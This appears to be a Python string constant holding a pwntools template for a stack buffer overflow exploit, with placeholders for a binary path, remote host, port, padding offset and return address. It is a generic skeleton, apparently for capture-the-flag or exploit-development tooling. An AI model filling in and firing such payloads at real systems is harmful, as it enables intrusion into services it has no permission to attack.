PWN_TEMPLATE = """
from pwn import *
context.binary = '{binary_path}'
io = process('{binary_path}') # or remote('{host}', {port})
payload = b'A' * {offset} + p64({target_addr})
io.sendline(payload)
print(io.recvall())
"""